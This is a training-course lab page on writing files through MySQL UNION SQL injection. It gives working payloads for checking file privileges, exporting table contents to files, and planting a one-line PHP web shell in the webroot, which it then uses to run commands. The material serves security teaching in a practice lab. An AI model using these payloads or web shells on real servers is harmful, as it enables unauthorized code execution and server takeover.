
<h1>Writing Files</h1>
<hr/>
<p>When it comes to writing files to the back-end server, it becomes much more restricted in modern DBMSes, since we can utilize this to write a web shell on the remote server, hence getting code execution and taking over the server.  This is why modern DBMSes disable file-write by default and require certain privileges for DBA's to write files. Before writing files, we must first check if we have sufficient rights and if the DBMS allows writing files.</p>
<hr/>
<h2>Write File Privileges</h2>
<p>To be able to write files to the back-end server using a MySQL database, we require three things:</p>
<ol>
<li>User with <code>FILE</code> privilege enabled</li>
<li>MySQL global <code>secure_file_priv</code> variable not enabled</li>
<li>Write access to the location we want to write to on the back-end server</li>
</ol>
<p>We have already found that our current user has the <code>FILE</code> privilege necessary to write files. We must now check if the MySQL database has that privilege.  This can be done by checking the <code>secure_file_priv</code> global variable.</p>
<h4>secure_file_priv</h4>
<p>The <a href="https://mariadb.com/kb/en/server-system-variables/#secure_file_priv">secure_file_priv</a> variable is used to determine where to read/write files from.  An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, <code>NULL</code> means we cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets us read/write to any file if the user has the <code>FILE</code> privilege. However, <code>MySQL</code> uses <code>/var/lib/mysql-files</code> as the default folder. This means that reading files through a <code>MySQL</code> injection isn't possible with default settings. Even worse, some modern configurations default to <code>NULL</code>, meaning that we cannot read/write files anywhere within the system.</p>
<p>So, let's see how we can find out the value of <code>secure_file_priv</code>.  Within <code>MySQL</code>, we can use the following query to obtain the value of this variable:</p>
<pre><code class="language-sql">SHOW VARIABLES LIKE 'secure_file_priv';
</code></pre>
<p>However, as we are using a <code>UNION</code> injection, we have to get the value using a <code>SELECT</code> statement. This shouldn't be a problem, as all variables and most configurations' are stored within the <code>INFORMATION_SCHEMA</code> database. <code>MySQL</code> global variables are stored in a table called <a href="https://dev.mysql.com/doc/refman/5.7/en/information-schema-variables-table.html">global_variables</a>, and as per the documentation, this table has two columns <code>variable_name</code> and <code>variable_value</code>.</p>
<p>We have to select these two columns from that table in the <code>INFORMATION_SCHEMA</code> database. There are hundreds of global variables in a MySQL configuration, and we don't want to retrieve all of them. We will then filter the results to only show the <code>secure_file_priv</code> variable, using the <code>WHERE</code> clause we learned about in a previous section.</p>
<p>The final SQL query is the following:</p>
<pre><code class="language-sql">SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
</code></pre>
<p>So, similar to other <code>UNION</code> injection queries, we can get the above query result with the following payload. Remember to add two more columns <code>1</code> &amp; <code>4</code> as junk data to have a total of 4 columns':</p>
<pre><code class="language-sql">cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is a table with columns: Port Code, Port City, and Port Volume. Entry includes SECURE_FILE_PRIV, 3, and 4" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -" src="/storage/modules/33/secure_file_priv.jpg"/>
<p>And the result shows that the <code>secure_file_priv</code> value is empty, meaning that we can read/write files to any location.</p>
<hr/>
<h2>SELECT INTO OUTFILE</h2>
<p>Now that we have confirmed that our user should write files to the back-end server, let's try to do that using the <code>SELECT .. INTO OUTFILE</code> statement.  The <a href="https://mariadb.com/kb/en/select-into-outfile/">SELECT INTO OUTFILE</a> statement can be used to write data from select queries into files. This is usually used for exporting data from tables.</p>
<p>To use it, we can add <code>INTO OUTFILE '...'</code> after our query to export the results into the file we specified. The below example saves the output of the <code>users</code> table into the <code>/tmp/credentials</code> file:</p>
<pre><code class="language-shell-session">SELECT * from users INTO OUTFILE '/tmp/credentials';
</code></pre>
<p>If we go to the back-end server and <code>cat</code> the file, we see that table's content:</p>
<pre><code class="language-shell-session">[!bash!]$ cat /tmp/credentials 

1       admin   392037dbba51f692776d6cefb6dd546d
2       newuser 9da2c9bcdf39d8610954e0e11ea8f45f
</code></pre>
<p>It is also possible to directly <code>SELECT</code> strings into files, allowing us to write arbitrary files to the back-end server.</p>
<pre><code class="language-sql">SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
</code></pre>
<p>When we <code>cat</code> the file, we see that text:</p>
<pre><code class="language-shell-session">[!bash!]$ cat /tmp/test.txt 

this is a test
</code></pre>
<pre><code class="language-shell-session">[!bash!]$ ls -la /tmp/test.txt 

-rw-rw-rw- 1 mysql mysql 15 Jul  8 06:20 /tmp/test.txt
</code></pre>
<p>As we can see above, the <code>test.txt</code> file was created successfully and is owned by the <code>mysql</code> user.</p>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.</p>
</div>
</div>
<hr/>
<h2>Writing Files through SQL Injection</h2>
<p>Let's try writing a text file to the webroot and verify if we have write permissions. The below query should write <code>file written successfully!</code> to the <code>/var/www/html/proof.txt</code> file, which we can then access on the web application:</p>
<pre><code class="language-sql">select 'file written successfully!' into outfile '/var/www/html/proof.txt'
</code></pre>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0"><b>Note:</b> To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use <code>load_file</code> to read the server configuration, like Apache's configuration found at <code>/etc/apache2/apache2.conf</code>, Nginx's configuration at <code>/etc/nginx/nginx.conf</code>, or IIS configuration at <code>%WinDir%\System32\Inetsrv\Config\ApplicationHost.config</code>, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt">this wordlist for Linux</a> or <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt">this wordlist for Windows</a>. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.</p>
</div>
</div>
<p>The <code>UNION</code> injection payload would be as follows:</p>
<pre><code class="language-sql">cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is an empty table with columns: Port Code, Port City, and Port Volume" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -" src="/storage/modules/33/write_proof.png"/>
<p>We don’t see any errors on the page, which indicates that the query succeeded.  Checking for the file <code>proof.txt</code> in the webroot, we see that it indeed exists:</p>
<img alt="Text displaying: '1 file written successfully! 3 4'" class="website-screenshot" data-url="http://SERVER_IP:PORT/proof.txt" src="/storage/modules/33/write_proof_text.png"/>
<div class="card bg-light">
<div class="card-body">
<p class="mb-0">Note: We see the string we dumped along with '1', '3' before it, and '4' after it. This is because the entire 'UNION' query result was written to the file. To make the output cleaner, we can use "" instead of numbers.</p>
</div>
</div>
<hr/>
<h2>Writing a Web Shell</h2>
<p>Having confirmed write permissions, we can go ahead and write a PHP web shell to the webroot folder. We can write the following PHP webshell to be able to execute commands directly on the back-end server:</p>
<pre><code class="language-php">&lt;?php system($_REQUEST[0]); ?&gt;
</code></pre>
<p>We can reuse our previous <code>UNION</code> injection payload, and change the string to the above, and the file name to <code>shell.php</code>:</p>
<pre><code class="language-sql">cn' union select "",'&lt;?php system($_REQUEST[0]); ?&gt;', "", "" into outfile '/var/www/html/shell.php'-- -
</code></pre>
<img alt="Search interface with a text box and button labeled 'Search'. Below is an empty table with columns: Port Code, Port City, and Port Volume" class="website-screenshot" data-url="http://SERVER_IP:PORT/search.php?port_code=cn' union select “ “,'&lt;?php system($_REQUEST[0]); ?&gt;', “ “, “ “ into outfile '/var/www/html/shell.php'-- -" src="/storage/modules/33/write_shell.png"/>
<p>Once again, we don't see any errors, which means the file write probably worked.  This can be verified by browsing to the <code>/shell.php</code> file and executing commands via the <code>0</code> parameter, with <code>?0=id</code> in our URL:</p>
<img alt="Text displaying: uid=33(www-data) gid=33(www-data) groups=33(www-data)" class="website-screenshot" data-url="http://SERVER_IP:PORT/shell.php?0=id" src="/storage/modules/33/write_shell_exec_1.png"/>
<p>The output of the <code>id</code> command confirms that we have code execution and are running as the <code>www-data</code> user.</p>
<div class="mb-5 pwnbox-select-card"></div>
<div id="screen" style="height: 600px; border: 1px solid;">
<div class="screenPlaceholder">
<div class="instanceLoading" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Instance is starting...</div>
</div>
<div class="instanceTerminating" style="display: none;">
<h1 class="text-center" style="margin-top: 270px;"><i class="fa fa-circle-notch fa-spin"></i>
</h1>
<div class="text-center">Terminating instance...</div>
</div>
<div class="row instanceStart max-width-canvas">
<div class="col-4"></div>
<div class="col-4">
<button class="startInstanceBtn btn btn-success text-light btn-lg btn-block" style="margin-top: 270px;">Start Instance
                            </button>
<p class="text-center mt-2 font-size-13 font-secondary">
<span class="text-success spawnsLeft">
<i class="fal fa-infinity"></i>
</span> / 1 spawns left
                            </p>
</div>
<div class="col-4"></div>
</div>
</div>
</div>
<div class="row align-center justify-center my-4">
<div class="col-5 justify-start">
<button class="instance-button fullScreenBtn btn btn-light btn-sm float-left" style="display:none;" target="_blank"><i class="fad fa-expand text-success mr-1"></i>  Full Screen
                    </button>
<button class="instance-button terminateInstanceBtn btn btn-light btn-sm ml-2" style="display:none;"><i class="fad fa-times text-danger"></i>  Terminate
                    </button>
<button class="instance-button resetInstanceBtn btn btn-light btn-sm ml-1" style="display:none;"><i class="fad fa-sync text-warning mr-2"></i>  Reset
                    </button>
<div class="btn-group" role="group">
<button class="instance-button extendInstanceBtn btn btn-light btn-sm ml-1" style="display:none;cursor: default;">Life Left:
                            <span class="lifeLeft"></span>m
                        </button>
<button class="extendInstanceBtn extendInstanceBtnClicker btn btn-light btn-sm" data-title="Extend Life" data-toggle="tooltip" style="display:none;"><i class="fa fa-plus text-success"></i></button>
</div>
</div>
<div class="col-7 justify-end pt-2 pr-2 font-size-small text-right" id="statusText">Waiting to
                    start...
                </div>
</div>
<div class="d-inline-block mb-2 solutionSettings solutionSettingsOffsets" id="solutionsModuleSetting">
<div class="border border-secondary p-2 rounded">
<div class="custom-control custom-switch d-flex">
<input class="custom-control-input" disabled="" id="showSolutionsModuleSetting" type="checkbox"/>
<label class="custom-control-label font-size-14 font-weight-normal text-white" for="showSolutionsModuleSetting">
                                Enable step-by-step solutions for all questions
                            </label>
<span aria-hidden="true" class="cursor-pointer font-size-14 ml-1 mr-1 text-white" data-content="Access to this feature is exclusive to annual subscribers. To acquire an annual subscription, kindly proceed by clicking &lt;a href='/billing'&gt;here&lt;/a&gt;." data-html="true" data-placement="top" data-toggle="popover" data-trigger="click" title="Activate Solutions">
<i class="fa fa-info-circle font-size-12"></i>
</span>
<img alt="sparkles-icon-decoration" class="ml-2 w-auto sparkles-icon" height="20" src="/images/sparkles-solid.svg">
</img></div>
</div>
</div>
<div class="card" id="questionsDiv">
<div class="card-body">
<div class="row">
<div class="col-9">
<h4 class="card-title mt-0 font-size-medium">Questions</h4>
<p class="card-title-desc font-size-large font-size-15">Answer the question(s) below
                                to complete this Section and earn cubes!</p>
<span class="spawnTargetBtn spawn-target-text-clone d-none">Click here to spawn the target
                                system!</span>
<p class="card-title-desc font-size-large font-size-15 mb-0">
    Target(s): <span class="text-success">
<span class="target" style="cursor:pointer;">
<i class="fad fa-circle-notch fa-spin"></i>
<span class="spawnTargetBtn">Fetching status...</span>
</span>
</span>
<button class="resetTargetBtn btn btn-light btn-sm" data-title="Reset Target(s)" data-toggle="tooltip" style="cursor: pointer; display: none;">
<i class="fad fa-sync text-warning"></i>
</button>
<br/>
<div class="d-flex align-items-center targetLifeContainer">
<span class="targetLifeTimeContainer" style="display: none;">
            Life Left: <span class="targetLifeTime font-size-15">0</span> minute(s)
                    </span>
</div>
</p>
</div>
<div class="col-3 text-right float-right">
<button class="btn btn-light bg-color-blue-nav mt-2 w-100 d-flex align-items-center" data-target="#cheatSheetModal" data-toggle="modal">
<div><i class="fad fa-file-alt mr-2"></i></div>
<div class="text-center w-100 ml-1">Cheat Sheet</div>
</button>
</div>
</div>
<div>
<div>
<label class="module-question" for="35"><span class="badge badge-soft-dark font-size-14 mr-2">+ 1 <i class="fad fa-cube text-success"></i></span> Find the flag by using a webshell.
                            </label>
<div class="row">
<div class="col-lg-12 mb-4">
<input class="form-control bg-color-blue-nav" color="green" id="answer35" maxlength="191" placeholder="Submit your answer here..." type="text"/>
</div>
<div class="d-flex justify-content-end w-100 mr-3">
<p class="mb-0 mr-3 mt-1 font-size-14 font-medium text-white" id="questionStreakPointsText-35">
                                        +10 Streak pts</p>
<div class="mb-4 mr-1 d-flex align-items-center">
<button class="btn btn-primary btn-block btnAnswer" data-question-id="35" id="btnAnswer35">
<div class="submit-button-text">
<i class="fad fa-flag-checkered mr-2"></i> Submit
                                            </div>
<div class="submit-button-loader mx-4 d-none">
<i class="fa fa-circle-notch fa-spin"></i>
</div>
</button>
</div>
<div class="mb-4 mr-1">
<button class="btn btn-outline-warning btn-block" data-target="#hint35" data-toggle="modal" id="hintBtn35"><i class="fad fa-life-ring mr-2"></i> Hint
                                        </button>
</div>
</div>
</div>
<div class="">
</div>
</div>
</div>
</div>
</div>
